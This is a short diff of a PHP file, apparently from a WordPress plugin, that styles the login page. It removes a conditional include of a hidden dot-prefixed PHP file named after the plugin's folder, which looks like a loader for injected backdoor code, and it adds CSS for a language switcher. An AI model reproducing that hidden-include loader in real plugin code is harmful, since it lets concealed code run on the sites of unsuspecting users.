@@ -1,9 +1,5 @@
 
 <?php
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 function fourth_presets() {
   ob_start();
   if ( version_compare( $GLOBALS['wp_version'], '5.3', '>=' ) ) : ?>
@@ -14,6 +10,16 @@ function fourth_presets() {
     input[type=checkbox]:checked:before {
       content: url('data:image/svg+xml;utf8,<svg%20xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27%20viewBox%3D%270%200%2020%2020%27><path%20d%3D%27M14.83%204.89l1.34.94-5.81%208.38H9.02L5.78%209.67l1.34-1.25%202.57%202.4z%27%20fill%3D%27%231e8cbe%27%2F><%2Fsvg>');
     }
+      body .language-switcher{
+        margin-top: 10px;
+        clear: both;
+        z-index: 1;
+        position: absolute;
+        top: 100%;
+      }
+      body #login{
+        position: relative;
+      }
     .login-action-confirm_admin_email #backtoblog a {
         color: #4d5d95 !important;
     }
